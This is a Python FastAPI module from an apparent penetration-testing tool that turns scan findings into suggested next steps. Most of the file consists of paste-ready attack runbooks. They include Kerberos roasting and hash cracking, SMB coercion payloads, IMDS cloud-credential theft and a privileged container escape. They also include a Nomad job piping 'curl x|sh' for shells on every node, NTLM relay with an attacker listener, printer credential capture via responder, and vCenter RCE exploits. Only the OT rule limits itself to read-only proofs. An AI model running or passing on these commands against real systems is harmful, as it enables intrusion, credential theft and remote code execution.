"""Scan jobs + live progress + the command catalog."""
from __future__ import annotations

import asyncio
import json

from fastapi import Body, FastAPI, Header, HTTPException
from fastapi.responses import StreamingResponse

from ..jobs import recce_argv
from .._common import _COMMANDS


# ---------------------------------------------------------------------------
# "recce suggests…" rules.  Each rule reads one shared-surface module and
# turns its facts into zero-or-more suggestion dicts of shape:
#   {"key": stable_id, "command": <catalog cmd or "">, "field": <field or "">,
#    "suggested_value": str, "reason": str, "confidence": "high|medium|low",
#    "source": <reader module name>, "external_cmd": <optional shell hint>}
# Rules are import-tolerant: a missing reader module is skipped, not fatal.
# ---------------------------------------------------------------------------

# Commands that carry a `--domain` field wired to the `domain` form input.
# The set is closed to catalog entries with `creds=True` so the frontend's
# Prefill can safely dispatch onto the existing form-state.
_DOMAIN_TARGETS = ("credenum", "certipy", "smb", "ldap", "ftp", "db",
                   "credsweep", "postgres", "mysql", "mssql", "mongodb")

# Commands that carry a `--user`/`username` field wired to the `username`
# form input.  Same closed-set rule as _DOMAIN_TARGETS.
_USER_TARGETS = ("credenum", "certipy", "smb", "ldap", "ftp",
                 "credsweep", "postgres", "mysql", "mssql", "mongodb")

# (protocol slug, matching OT vendor keyword hint).  Rule 6 emits one
# suggestion per OT protocol against every host that carries that asset
# family so the operator can rerun s7/opcua/bacnet/... against known-good
# targets in one click.
_OT_SWEEP_MAP = {
    "s7":     ("siemens",),
    "opcua":  ("opc", "kepware", "opc-ua"),
    "bacnet": ("bacnet", "delta", "honeywell", "johnson"),
    "dnp3":   ("dnp3",),
    "iec104": ("iec-104", "iec104"),
    "enip":   ("rockwell", "allen-bradley", "ethernetip"),
}


def _rule_domain(hosts, creds, loot_dir):          # noqa: ARG001
    """known_domains → --domain prefill for credentialed commands."""
    try:
        from ...core.known_domains import known_domains
    except ImportError:
        return []
    kd = known_domains(hosts, creds)
    primary = (kd.get("primary_dns") or "").strip()
    if not primary:
        return []
    realm = primary.upper()
    reason = (f"Learned AD realm `{primary}` from NTLM/LDAP enumeration "
              f"across {kd.get('total_known', 0)} host(s).")
    return [{"key": f"domain-{cmd}-{realm}", "command": cmd, "field": "domain",
             "suggested_value": realm, "reason": reason,
             "confidence": "high", "source": "known_domains"}
            for cmd in _DOMAIN_TARGETS]


def _rule_admin_user(hosts, creds, loot_dir):      # noqa: ARG001
    """known_users → --user prefill for the first admincount=1 principal."""
    try:
        from ...creds.known_users import collect_user_accounts
    except ImportError:
        return []
    admins = [a for a in collect_user_accounts(hosts)
              if (a.get("attrs") or {}).get("admincount")
              or a["priority"] == 0]           # _priority(0) == admin bucket
    if not admins:
        return []
    name = admins[0]["name"]
    reason = (f"`{name}` is flagged adminCount=1 (or well-known-admin) — "
              f"prefer it for authenticated checks over an arbitrary user.")
    return [{"key": f"user-{cmd}-{name.lower()}", "command": cmd,
             "field": "username", "suggested_value": name, "reason": reason,
             "confidence": "high", "source": "known_users"}
            for cmd in _USER_TARGETS]


def _rule_hashes_potfile(hosts, creds, loot_dir):  # noqa: ARG001
    """known_hashes > 0 → surface the hashcat + `recce creds --potfile` handoff."""
    try:
        from ...creds.known_hashes import known_hashes
    except ImportError:
        return []
    r = known_hashes(creds, loot_dir=loot_dir)
    if not r.get("total"):
        return []
    cats = ", ".join(sorted(r.get("categories") or {})) or "nthash"
    total = r["total"]
    reason = (f"{total} crackable hash(es) captured ({cats}). Crack with "
              f"hashcat against `<eng>/loot/*.hash`, then feed the potfile "
              f"back with `recce creds --potfile <pot>`.")
    return [{"key": f"hashes-potfile-{total}", "command": "",
             "field": "", "suggested_value": "",
             "external_cmd": "hashcat -m <mode> <eng>/loot/<file>.hash <wordlist>",
             "reason": reason, "confidence": "medium", "source": "known_hashes"}]


def _rule_relay_targets(hosts, creds, loot_dir):   # noqa: ARG001
    """relay_targets → ntlmrelayx handoff (external tool)."""
    try:
        from ...core.relay_targets import relay_target_lines
    except ImportError:
        return []
    lines = relay_target_lines(hosts)
    if not lines:
        return []
    reason = (f"{len(lines)} SMB host(s) accept unsigned sessions — a coerced "
              f"NTLM auth would relay. Write the list to a file and run "
              f"`ntlmrelayx -tf targets.txt -smb2support`.")
    return [{"key": f"relay-ntlmrelayx-{len(lines)}", "command": "",
             "field": "", "suggested_value": "",
             "external_cmd": f"ntlmrelayx.py -tf targets.txt -smb2support   # {len(lines)} target(s)",
             "reason": reason, "confidence": "high", "source": "relay_targets"}]


def _rule_ot_sweep(hosts, creds, loot_dir):        # noqa: ARG001
    """known_ot_assets → per-protocol sweep against learned OT IPs."""
    try:
        from ...core.known_ot_assets import known_ot_assets
    except ImportError:
        return []
    kot = known_ot_assets(hosts)
    if not kot.get("assets"):
        return []
    out: list[dict] = []
    # Group learned assets by (vendor keyword → protocol slug).  A single
    # asset can qualify for more than one protocol (e.g. Rockwell → enip)
    # but the resulting suggestion is keyed on (protocol, ip) so duplicates
    # collapse via the caller's dedup.
    by_ip: dict[str, list[str]] = {}
    for a in kot["assets"]:
        vendor = (a.get("vendor") or "").lower()
        ip = a.get("ip", "")
        if not ip:
            continue
        for slug, hints in _OT_SWEEP_MAP.items():
            if any(h in vendor for h in hints):
                by_ip.setdefault(slug, []).append(ip)
    for slug, ips in by_ip.items():
        ips = sorted(set(ips))
        out.append({"key": f"ot-{slug}-{','.join(ips[:4])}",
                    "command": slug, "field": "targets",
                    "suggested_value": ", ".join(ips),
                    "reason": (f"Learned {len(ips)} {slug.upper()} asset(s) via OT "
                               f"fingerprint — run the deep {slug} probe against them."),
                    "confidence": "high", "source": "known_ot_assets"})
    return out


def _rule_devices_vulns(hosts, creds, loot_dir):   # noqa: ARG001
    """known_devices w/ cve_candidates → suggest a targeted vulns rescan."""
    try:
        from ...core.known_devices import known_devices
    except ImportError:
        return []
    kd = known_devices(hosts)
    cves = kd.get("cve_candidates") or []
    if not cves:
        return []
    ips = sorted({(c.get("device") or {}).get("ip", "") for c in cves})
    ips = [ip for ip in ips if ip]
    if not ips:
        return []
    vendors = sorted({(c.get("device") or {}).get("vendor", "")
                      for c in cves if (c.get("device") or {}).get("vendor")})
    reason = (f"{len(cves)} CVE candidate(s) inferred from device fingerprints "
              f"({', '.join(vendors[:3]) or 'vendor'}) — rerun vulns against "
              f"the affected {len(ips)} host(s).")
    return [{"key": f"vulns-devices-{','.join(ips[:4])}", "command": "vulns",
             "field": "targets", "suggested_value": ", ".join(ips),
             "reason": reason, "confidence": "medium",
             "source": "known_devices"}]


def _rule_mail_cross_transport(hosts, creds, loot_dir):  # noqa: ARG001
    """known_mail_accounts → cross-transport spray on smtp/imap/pop3."""
    try:
        from ...creds.known_mail_accounts import known_mail_accounts
    except ImportError:
        return []
    km = known_mail_accounts(hosts)
    accounts = km.get("accounts") or []
    if not accounts:
        return []
    ips = sorted({ip for a in accounts for ip in (a.get("hosts") or [])})
    if not ips:
        return []
    users_n = len(km.get("by_user") or {})
    out = []
    for cmd in ("smtp", "imap", "pop3"):
        out.append({"key": f"mail-{cmd}-{','.join(ips[:3])}",
                    "command": cmd, "field": "targets",
                    "suggested_value": ", ".join(ips),
                    "reason": (f"{users_n} mail identit(y|ies) learned across "
                               f"{len(ips)} host(s) — spray the same names "
                               f"through {cmd.upper()} for cross-transport reuse."),
                    "confidence": "medium",
                    "source": "known_mail_accounts"})
    return out


def _rule_hostkey_reuse(hosts, creds, loot_dir):   # noqa: ARG001
    """known_hostkeys reuse → info-only cluster hint (appliance / golden image)."""
    try:
        from ...core.known_hostkeys import known_hostkeys
    except ImportError:
        return []
    reused = (known_hostkeys(hosts) or {}).get("reused") or []
    if not reused:
        return []
    first = reused[0]
    ips = first.get("ips") or []
    reason = (f"SSH host-key reused across {len(ips)} distinct host(s) "
              f"({', '.join(ips[:4])}{'…' if len(ips) > 4 else ''}) — "
              f"appliance family or golden-image clone; a shared credential "
              f"or SSH key almost certainly rides along.")
    return [{"key": f"hostkey-reuse-{first.get('fingerprint', '')[:16]}",
             "command": "", "field": "", "suggested_value": "",
             "reason": reason, "confidence": "medium",
             "source": "known_hostkeys"}]


def _rule_hostname_vhosts(hosts, creds, loot_dir):  # noqa: ARG001
    """known_hostnames (FQDN) + web endpoints → suggest scanning by FQDN."""
    try:
        from ...core.known_hostnames import known_hostnames
    except ImportError:
        return []
    web_hosts = {h.ip for h in hosts
                 for p in (h.open_ports or [])
                 if (p.service or "").lower().startswith("http")
                 or p.portid in (80, 443, 8080, 8443)}
    if not web_hosts:
        return []
    names = known_hostnames(hosts, only_fqdn=True)
    by_host = names.get("by_host") or {}
    picks = [(ip, n[0]) for ip, n in by_host.items() if ip in web_hosts and n]
    if not picks:
        return []
    fqdns = sorted({n for _ip, n in picks})[:4]
    reason = (f"{len(fqdns)} FQDN(s) learned for HTTP host(s) — re-run web "
              f"enumeration by name to hit vhost-scoped content that IP-only "
              f"scans miss.")
    return [{"key": f"web-vhost-{','.join(fqdns)}", "command": "web",
             "field": "targets", "suggested_value": ", ".join(fqdns),
             "reason": reason, "confidence": "medium",
             "source": "known_hostnames"}]


def _rule_t3_capable_findings(hosts, creds, loot_dir):  # noqa: ARG001
    """Vulns rated at (or one step below) the initial-access boundary →
    external-tool handoff card carrying the finding's exploit_note as the
    shell hint. Reads Vuln.depth_tier (T0-T4 rubric per core.depth):
    every t3 finding qualifies (any severity — t3 already means initial-
    access-capable), plus any t2 finding at critical/high severity."""
    try:
        from ...core.depth import rank as _tier_rank
    except ImportError:
        return []
    _sev_rank = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}
    picks: list = []
    for h in hosts or []:
        for v in (getattr(h, "vulns", None) or []):
            tier = (getattr(v, "depth_tier", "") or "").lower()
            sev = (getattr(v, "severity", "") or "").lower()
            if tier == "t3" or (tier == "t2" and sev in ("critical", "high")):
                picks.append(v)
    if not picks:
        return []
    picks.sort(
        key=lambda v: (
            _tier_rank((getattr(v, "depth_tier", "") or "").lower()),
            1 if getattr(v, "kev", False) else 0,
            _sev_rank.get((getattr(v, "severity", "") or "").lower(), 0),
            float(getattr(v, "epss", 0.0) or 0.0),
        ),
        reverse=True,
    )
    out: list[dict] = []
    for v in picks[:10]:
        tier = (getattr(v, "depth_tier", "") or "").lower()
        conf = ("high" if getattr(v, "kev", False)
                else ("medium" if tier == "t3" else "low"))
        out.append({
            "key": f"depth:{v.ip}:{v.port}:{v.script_id}",
            "command": "", "field": "", "suggested_value": "",
            "reason": (f"{v.title} on {v.ip}:{v.port} — "
                       f"depth-tier {v.depth_tier}, {v.severity} severity"),
            "confidence": conf, "source": "depth_tier_gate",
            "external_cmd": getattr(v, "exploit_note", "") or "",
        })
    return out


# ---------------------------------------------------------------------------
# Chain rules.  Each entry names a set of finding kinds (matched against
# `Vuln.script_id`) that, when co-present in the engagement, unlock a
# multi-step attack path a tester should run as one unit.  A rule fires when
# any one of its triggers appears in the store; the resulting suggestion
# carries the paste-ready command chain plus a rationale.  The `severity`
# field ("critical"/"high") is preserved verbatim on the emitted dict — the
# frontend renders it as the card accent — and the existing "confidence"
# field is derived from it so old consumers keep working.
# ---------------------------------------------------------------------------

_CHAIN_RULES: tuple[dict, ...] = (
    {
        "name": "chain_ad_kerberos",
        "severity": "critical",
        "triggers": frozenset({
            "ldap_anon_bind", "ldap_rootdse", "ldap_anon_read", "asrep_roast",
            "kerberos_spray_success", "mssql_kerberoastable_spn",
            "ldap_laps_readable", "ldap_rbcd",
        }),
        "suggestion": (
            "Pull the full user set from LDAP anon-read (ldapsearch -x -H "
            "ldap://<dc> -b <rootDSE-namingContext> '(objectClass=user)' "
            "sAMAccountName userPrincipalName servicePrincipalName memberOf), "
            "feed sAMAccountNames to GetNPUsers.py <domain>/ -usersfile users.txt "
            "-no-pass -dc-ip <dc> -format hashcat for AS-REP roast, then "
            "GetUserSPNs.py <domain>/<sprayed_user>:<pw> -dc-ip <dc> -request "
            "for Kerberoast; crack with hashcat -m 18200/-m 13100 -w3 "
            "wordlists/*.txt --rules-file rules/OneRuleToRuleThemAll.rule. If "
            "ldap_laps_readable fired, dump ms-Mcs-AdmPwd on the same bind for "
            "local-admin creds; if ldap_rbcd fired, prep rbcd.py -delegate-from "
            "<controlled_computer$> -delegate-to <target$> -action write."
        ),
        "rationale": (
            "Combines the AD enum surface with the two hash-yielding Kerberos "
            "preauth flaws and the SQL SPN roast into one crack-first-then-"
            "lateral runbook — the canonical initial-foothold-to-DA path an "
            "internal engagement always executes."
        ),
    },
    {
        "name": "chain_smb_post_null_loot",
        "severity": "high",
        "triggers": frozenset({
            "null_session", "readable_share", "writable_share", "guest_enabled",
            "smb_ntlm_info_disclosure",
        }),
        "suggestion": (
            "Enumerate every share and its ACL from the null/guest session: "
            "enum4linux-ng -A -u '' -p '' <host> and nxc smb <host> -u '' -p '' "
            "--shares --users --groups --pass-pol. For each readable share: "
            "smbclient //<host>/<share> -N -c 'recurse ON; prompt OFF; mget *' "
            "into loot/, then run manspider <host> -u '' -p '' -d . -e docx "
            "xlsx pdf ps1 config kdbx -f "
            "'password|passwd|secret|api[_-]?key|conn(ection)?string'. If "
            "writable_share fired on a user-traversed share (NETLOGON/Profiles/"
            "Homes are ideal), drop an SCF or LNK icon-fetch payload "
            "(@ntlmrelayx capture) to coerce authentication and pipe the "
            "hashes into the existing relay/crack pipeline."
        ),
        "rationale": (
            "Null/guest access without immediate loot triage wastes the "
            "finding; combining the read + write + guest kinds tells the "
            "tester exactly which shares to scrape and where to plant a "
            "coercion primitive that feeds the already-wired relay chain."
        ),
    },
    {
        "name": "chain_cloud_metadata_pivot",
        "severity": "critical",
        "triggers": frozenset({
            "web_ssrf_reaches_imds_credentials", "imds_reachable_via_proxy",
            "imds_reachable_from_host", "imds_iam_credentials_exposed",
            "azure_managed_identity_token_exposed",
            "gcp_service_account_token_exposed",
            "alibaba_ram_credentials_exposed", "imds_v1_enabled",
            "imds_user_data_secrets", "instance_identity_disclosed",
        }),
        "suggestion": (
            "Exfil the temp creds first: for AWS, curl -s "
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
            "<role> (through the SSRF/proxy) and export "
            "AWS_ACCESS_KEY_ID/SECRET/SESSION_TOKEN, then aws sts "
            "get-caller-identity && aws iam list-attached-role-policies "
            "--role-name <role> && enumerate-iam / ScoutSuite / Pacu "
            "(import_keys, then run iam__enum_permissions,iam__privesc_scan). "
            "For Azure MI: curl 'http://169.254.169.254/metadata/identity/"
            "oauth2/token?api-version=2018-02-01&resource=https://"
            "management.azure.com/' -H 'Metadata:true' and az login --identity "
            "or ROADrecon auth --access-token <jwt>. For GCP: TOKEN=$(curl -H "
            "'Metadata-Flavor: Google' 169.254.169.254/computeMetadata/v1/"
            "instance/service-accounts/default/token | jq -r .access_token); "
            "gcloud auth activate-refresh-token or hand to GCPBucketBrute/"
            "gcp_scanner. Also grab user-data (may hold bootstrap secrets) "
            "and instance-identity signed doc for lateral trust proofs."
        ),
        "rationale": (
            "SSRF-to-IMDS is only useful if the tester immediately turns the "
            "ephemeral token into a cloud-plane enumeration; the chain names "
            "the exact provider path so the finding becomes a role-assume + "
            "privesc scan instead of a screenshot."
        ),
    },
    {
        "name": "chain_container_orchestrator_escape",
        "severity": "critical",
        "triggers": frozenset({
            "docker_api", "docker_host_escape", "docker_runc_cve",
            "docker_engine_cve", "kubelet_anon", "kubelet_exec", "kubelet_ro",
            "kubelet_logs_dir", "k8s_escape_pods", "dockerreg_anonymous_catalog",
            "dockerreg_manifest_readable", "docker_env_secrets",
            "docker_secrets", "docker_swarm_secrets", "docker_volumes",
        }),
        "suggestion": (
            "If docker_api is exposed: docker -H tcp://<host>:2375 run --rm "
            "-it --privileged --pid=host --net=host -v /:/host alpine chroot "
            "/host sh (instant node-root). Kubelet anon: curl -sk "
            "https://<node>:10250/pods | jq '.items[].metadata.name' then "
            "curl -sk 'https://<node>:10250/exec/<ns>/<pod>/<container>?"
            "command=sh&input=1&output=1&tty=1' via kubeletctl exec "
            "--all-pods sh. Registry: curl -s http://<reg>:5000/v2/_catalog "
            "then docker pull <reg>/<img>:<tag> && dive <img> / trufflehog "
            "docker --image <img> to scrape baked secrets and .dockerenv "
            "envs. Cross-reference docker_env_secrets/docker_secrets loot for "
            "kubeconfigs; if k8s_escape_pods fired, apply a hostPath:/ mount "
            "pod spec (kubectl --token=<jwt> apply -f evil-pod.yaml) for node "
            "breakout."
        ),
        "rationale": (
            "Container-plane findings only pay off when chained — exposed "
            "API to node-root, then registry pull to secrets to a hostPath "
            "escape pod — and this rule sequences that so the tester doesn't "
            "stop at 'anonymous catalog listed'."
        ),
    },
    {
        "name": "chain_hashicorp_stack_secrets",
        "severity": "critical",
        "triggers": frozenset({
            "vault_dev_mode", "vault_unsealed_no_tls", "vault_uninitialized",
            "vault_authed_mounts", "vault_authed_secret_read",
            "vault_mount_list_open", "vault_raft_snapshot_dump",
            "consul_unauth_read", "consul_kv_secrets", "consul_authed",
            "nomad_unauth_read", "nomad_variables_readable",
            "nomad_job_submit_rce", "nomad_acl_bootstrap_available",
            "nomad_integration_token_leak",
        }),
        "suggestion": (
            "Vault first: VAULT_ADDR=http://<v>:8200 vault status; if "
            "dev_mode/unsealed_no_tls, vault secrets list && for m in $(vault "
            "secrets list -format=json | jq -r 'keys[]'); do vault kv list "
            "-format=json $m; done then vault kv get -format=json <path> for "
            "every leaf; if vault_raft_snapshot_dump, vault operator raft "
            "snapshot save snap.snap && offline-decrypt with vault-raft-tools. "
            "Consul: consul kv export / (or curl -s http://<c>:8500/v1/kv/?"
            "recurse | jq -r '.[]|.Key+\": \"+(.Value|@base64d)') and grep for "
            "aws_/token/pw. Nomad: NOMAD_ADDR=http://<n>:4646 nomad var list "
            "-namespace=* -out=json then, if nomad_job_submit_rce, submit a "
            "raw_exec job (nomad job run rev.hcl with driver=raw_exec "
            "command=/bin/sh args=['-c','curl x|sh']) to land a shell on "
            "every eligible node. If acl_bootstrap_available, nomad acl "
            "bootstrap -> management token -> full-cluster ownership."
        ),
        "rationale": (
            "The HashiCorp stack chains cleanly: Vault/Consul hand over the "
            "secrets, Nomad hands over the compute — miss one and the tester "
            "writes a partial finding; miss the chain and they miss cluster-"
            "wide RCE."
        ),
    },
    {
        "name": "chain_ntlm_username_harvest",
        "severity": "high",
        "triggers": frozenset({
            "ntlm_disclosure", "smb_ntlm_info_disclosure", "rdp_ntlm_info",
            "winrm_ntlm_info", "smtp_auth_ntlm_leak", "pop3_ntlm_info",
            "telnet_ntlm_info_leak", "imap_sasl_mechanisms",
            "webdav_auth_scheme",
        }),
        "suggestion": (
            "Aggregate every disclosed NetBIOS name, DNS domain, DNS computer "
            "name, and forest name across the NTLM-leak kinds (nxc smb "
            "<hosts> --gen-relay-list ntlm.txt; nxc ldap <dc> --users to "
            "cross-reference), then build a spray list: printf '%s\\n' "
            "<domain>\\\\<user> > spray.txt and run nxc smb <dc> -u users.txt "
            "-p 'Winter2025!' --continue-on-success (respect ldap_lockout "
            "thresholds — if that finding is present, cap attempts to "
            "<threshold-1> per user per window). Add a Kerberos pre-auth "
            "timing pass: kerbrute userenum -d <domain> --dc <dc> users.txt "
            "to validate accounts without triggering 4625s."
        ),
        "rationale": (
            "Every leaking protocol independently offers a partial NTLM "
            "tuple; only the union gives a clean domain\\forest\\dnsname "
            "triple, and only that triple makes a spray both accurate and "
            "low-noise."
        ),
    },
    {
        "name": "chain_unauth_datastore_datamine",
        "severity": "high",
        "triggers": frozenset({
            "redis_unauth", "mongo_unauth", "es_unauth", "es_anonymous",
            "couchdb_admin_party", "couchdb_unauth_dbs", "etcd_open",
            "etcd_unauth_read", "memcached_unauth", "memcached_values_readable",
            "cassandra_noauth", "pg_trust_auth", "influxdb_unauth",
            "consul_unauth_read", "zk_dump",
        }),
        "suggestion": (
            "Fan out a single loot-walker per store into "
            "loot/datastores/<host>_<port>/: redis-cli -h <h> --scan | head "
            "-1000 && redis-cli -h <h> --rdb dump.rdb; mongoexport --host "
            "<h> --db <db> --collection <c> --out <c>.json (list first with "
            "mongo <h> --eval 'db.adminCommand({listDatabases:1})'); curl -s "
            "http://<h>:9200/_cat/indices?v && elasticdump --input=http://"
            "<h>:9200/<idx> --output=<idx>.json; curl -s http://<h>:5984/"
            "_all_dbs; etcdctl --endpoints=<h>:2379 get / --prefix "
            "--keys-only | head; memcdump --servers=<h>; cqlsh <h> -e 'DESC "
            "KEYSPACES' then COPY <ks>.<tbl> TO 'out.csv'; psql -h <h> -U "
            "postgres -c '\\l' then pg_dump; influx -host <h> -execute "
            "'SHOW DATABASES'. Grep every dump with trufflehog filesystem "
            "loot/datastores/ --only-verified and gitleaks detect --no-git "
            "--source loot/datastores/ to surface tokens/JWTs/AWS keys for "
            "the cloud-pivot rule."
        ),
        "rationale": (
            "Any single unauth datastore is a medium; the tester's actual "
            "next move is a bulk multi-store scrape into a single greppable "
            "loot tree — this rule gives one paste-ready pass and hands its "
            "output into the credential-pivot rules."
        ),
    },
    {
        "name": "chain_mssql_linked_privesc",
        "severity": "critical",
        "triggers": frozenset({
            "mssql_default_creds", "mssql_impersonation_chain",
            "linked_reachable", "linked_fixed_login", "linked_sysadmin",
            "xp_cmdshell", "mssql_openrowset_read",
            "mssql_external_script_rce", "pg_rce", "mysql_udf_loaded",
            "mysql_file_priv", "impersonation", "sysadmin_creds",
            "trustworthy", "public_role",
        }),
        "suggestion": (
            "Enter with mssqlclient.py <user>:<pw>@<host> -windows-auth (or "
            "default creds), then EXEC sp_linkedservers; and for each: EXEC "
            "('SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT "
            "[<linked>]; walk the linked_sysadmin edges with PowerUpSQL "
            "Get-SQLServerLinkCrawl -Instance <h> -Verbose -Query 'EXEC "
            "master..xp_cmdshell ''whoami'''. If xp_cmdshell disabled but "
            "impersonation fired, EXECUTE AS LOGIN='sa'; then re-enable via "
            "sp_configure. openrowset_read -> cross-db file reads (SELECT * "
            "FROM OPENROWSET(BULK 'C:\\Users\\<u>\\Desktop\\pw.txt', "
            "SINGLE_CLOB) x;). mssql_external_script_rce -> "
            "sp_execute_external_script @language=N'Python',@script=N'import "
            "os;os.system(\"...\")'. Cross-engine: pg_rce (COPY ... PROGRAM), "
            "mysql_udf_loaded (SELECT sys_exec('...')) — same command-exec "
            "pivot, different vendor."
        ),
        "rationale": (
            "Linked-server + impersonation + xp_cmdshell is the classic "
            "'medium creds -> SYSTEM on unrelated host via trusted link' "
            "path that testers miss when findings are viewed one-server-at-"
            "a-time; this rule sequences the crawl."
        ),
    },
    {
        "name": "chain_coerce_and_relay",
        "severity": "critical",
        "triggers": frozenset({
            "msrpc_coercion", "smb_signing_not_required", "webdav_enabled",
            "webdav_put_rce", "smtp_auth_ntlm_leak", "imap_gssapi_relay",
            "winrm_relay_target", "ldap_cleartext", "ldap_weak_sasl_mech",
        }),
        "suggestion": (
            "Start the relay listener aimed at the highest-value targets: "
            "ntlmrelayx.py -tf relay_targets.txt -smb2support "
            "--delegate-access --escalate-user <controlled_user> -socks (add "
            "--http-port 8080 and -wh <attacker> for WebDAV coercion, "
            "--no-http-server off). Then coerce with the most-supported "
            "primitive available: coercer coerce -t <victim> -l <attacker> "
            "-u <user> -p <pw> (auto-tries PetitPotam/PrinterBug/DFSCoerce/"
            "MS-EFSRPC/MS-RPRN/MS-FSRVP). If ldap_weak_sasl_mech or "
            "ldap_cleartext fired on a DC, add -t ldaps://<dc> for RBCD "
            "write; if winrm_relay_target fired, add -t "
            "http://<winrm>:5985/wsman for remote-command. Track successful "
            "relays in socks list and use proxychains for follow-on."
        ),
        "rationale": (
            "Coercion primitives and unsigned SMB (or unsigned LDAP/HTTP) "
            "are two halves of the same attack; the existing relay-targets "
            "rule only names the target list — this one wires the coercion "
            "side and the multi-transport relay flags."
        ),
    },
    {
        "name": "chain_printer_to_domain_creds",
        "severity": "high",
        "triggers": frozenset({
            "ipp_cups", "ipp_uri_harvest", "ipp_get_jobs", "lpd_queue_open",
            "lpd_queue_leak", "lpd_jetdirect_cve", "webdav_href_leak",
            "cups_admin_open", "cups_admin_auth", "printer_stack_correlation",
            "ipp_printers",
        }),
        "suggestion": (
            "Pull the current queue for LDAP/SMB/Kerberos service tickets "
            "baked into scan-to-file/scan-to-email jobs: ipptool -tv "
            "ipp://<host>/printers/<q> get-jobs.test then curl -s "
            "http://<host>:631/jobs?which_jobs=all | grep -Eo "
            "'(ldap|smb|http|kerberos)://\\S+'. If admin open/authed, "
            "reconfigure LDAP bind to point at your responder: curl -u "
            "<admin>:<pw> -X POST http://<host>:631/admin -d 'OP=set-printer-"
            "options&PRINTER_NAME=<q>&AUTH_INFO_REQUIRED=negotiate' with your "
            "listener up (responder -I <iface> -wF); many devices immediately "
            "re-bind and cough the DA-privilege service account cleartext. "
            "jetdirect/lprng CVEs -> check exploit-db and PJL sh commands "
            "(PRET pret.py <host> pjl)."
        ),
        "rationale": (
            "Printers hold configured LDAP/SMB creds for scan-to-folder — "
            "swapping their bind target to a responder yields cleartext "
            "creds for whatever account was configured, which is often "
            "domain-privileged; a chain no single kind conveys."
        ),
    },
    {
        "name": "chain_ot_ics_process_impact",
        "severity": "high",
        "triggers": frozenset({
            "s7_put_get_enabled", "s7_stop_start_possible",
            "s7_protection_level", "s7_read_var_ok",
            "s7_legacy_password_readout", "modbus_device_id",
            "iec104_control_writable", "iec104_reset_writable",
            "iec104_clock_writable", "iec104_startdt_accepted",
            "dnp3_control_surface", "enip_unauth_stop_cpu", "enip_pccc_read",
            "enip_firmware_upload_capable", "bacnet_unauth_write",
            "bacnet_reinitialize_permitted", "bacnet_dcc_default_password",
            "opcua_anonymous_allowed", "opcua_security_mode_none",
        }),
        "suggestion": (
            "DO NOT execute write/stop/reset commands on production OT "
            "without a written safety window and a plant engineer on-console. "
            "Instead, document impact via read-only proofs: snap7-cli <host> "
            "ReadArea DB 1 0 32 (S7); modbus-cli read <host> h@0 16 "
            "(Modbus); mbtget -r3 -a 0 -n 16 <host>; iec-104-client <host> "
            "--command interrogate (read only, no C_SC/C_DC); opcua-client "
            "-e opc.tcp://<host>:4840 -a browse. Screenshot process values, "
            "log the writable/stop/reinit primitives with the exact PDU that "
            "would trigger them (pcap + decoded), and hand to the client "
            "with a proposed maintenance-window test plan. Never issue a "
            "stop/write/reset command without change control — an ICS "
            "finding is a signed report, not a live exploit."
        ),
        "rationale": (
            "OT write/stop primitives are unambiguous impact evidence, but "
            "the correct engagement action is documented read-only proof + "
            "a witnessed maintenance-window replay — the rule is "
            "deliberately safety-first because a wrong click here injures "
            "people."
        ),
    },
    {
        "name": "chain_esxi_vcenter_takeover",
        "severity": "critical",
        "triggers": frozenset({
            "vsphere_cve_2021_21985", "vsphere_cve_2024_37085",
            "vsphere_sso_domain", "vsphere_local_users",
            "vsphere_sessionmanager_open", "vsphere_valid_creds",
            "vsphere_linked", "vsphere_vami", "slp_esxi_openslp_rce",
            "vsphere_outdated_build", "vsphere_stale_snapshot",
        }),
        "suggestion": (
            "If cve_2021_21985 fired: python3 CVE-2021-21985.py -t "
            "https://<vc> (unauth vRealize plugin RCE -> root shell on the "
            "appliance). If cve_2024_37085 fired: after obtaining any domain "
            "foothold, create AD group 'ESX Admins' and add controlled user "
            "-> immediate host-root on every joined ESXi. openslp_rce "
            "(CVE-2021-21974): curl the OpenSLP payload against <host>:427 "
            "for ring-0 RCE (ESXiArgs family). With vsphere_valid_creds: "
            "govc -u '<u>:<p>@<vc>' -k=true ls / && vm.info -json '*' && "
            "datastore.download <ds> vmx-file /tmp; export a target VM's "
            ".vmdk, mount offline (guestmount / libguestfs / kpartx), grab "
            "SAM/NTDS or /etc/shadow with no EDR in-path. vsphere_linked -> "
            "repeat against every linked-mode vCenter; vsphere_stale_snapshot "
            "-> snapshot revert as a post-exploitation persistence primitive."
        ),
        "rationale": (
            "vCenter/ESXi is the most efficient DA-equivalent in a "
            "virtualized shop — offline .vmdk mount defeats EDR and yields "
            "NTDS or shadow directly; the chain lists the four unauth RCEs "
            "and the credentialed path in the order a red-teamer actually "
            "tries them."
        ),
    },
)


def _make_chain_rule(spec: dict):
    """Build a callable rule from a chain spec.

    Fires when any host in the engagement carries a Vuln whose script_id
    matches one of the spec's triggers. Emits a single suggestion dict of
    the same shape the other rules emit, with the `severity` string carried
    through verbatim and `confidence` derived from it ("critical" -> "high",
    "high" -> "medium") so the existing frontend still ranks the card.
    """
    triggers: frozenset[str] = spec["triggers"]
    sev: str = spec["severity"]
    conf = "high" if sev == "critical" else "medium"
    src = spec["name"]
    suggestion = spec["suggestion"]
    rationale = spec["rationale"]

    def _rule(hosts, creds, loot_dir):  # noqa: ARG001
        hits: list[str] = []
        for h in hosts or []:
            for v in (getattr(h, "vulns", None) or []):
                sid = (getattr(v, "script_id", "") or "").lower()
                if sid in triggers:
                    hits.append(sid)
        if not hits:
            return []
        kinds = sorted(set(hits))
        key_hint = ",".join(kinds[:4])
        return [{
            "key": f"{src}-{key_hint}",
            "command": "", "field": "", "suggested_value": "",
            "external_cmd": suggestion,
            "reason": rationale,
            "severity": sev,
            "confidence": conf,
            "source": src,
        }]

    _rule.__name__ = "_rule_" + src.removeprefix("chain_")
    _rule.__doc__ = f"Chain rule: {src} (severity={sev}). {rationale}"
    return _rule


# Materialise one callable per chain spec — kept in module scope so the
# tests can import them by name (_rule_ad_kerberos_chain etc.) exactly as
# the older hand-written rules are.
_rule_ad_kerberos_chain = _make_chain_rule(_CHAIN_RULES[0])
_rule_smb_post_null_loot = _make_chain_rule(_CHAIN_RULES[1])
_rule_cloud_metadata_pivot = _make_chain_rule(_CHAIN_RULES[2])
_rule_container_orchestrator_escape = _make_chain_rule(_CHAIN_RULES[3])
_rule_hashicorp_stack_secrets = _make_chain_rule(_CHAIN_RULES[4])
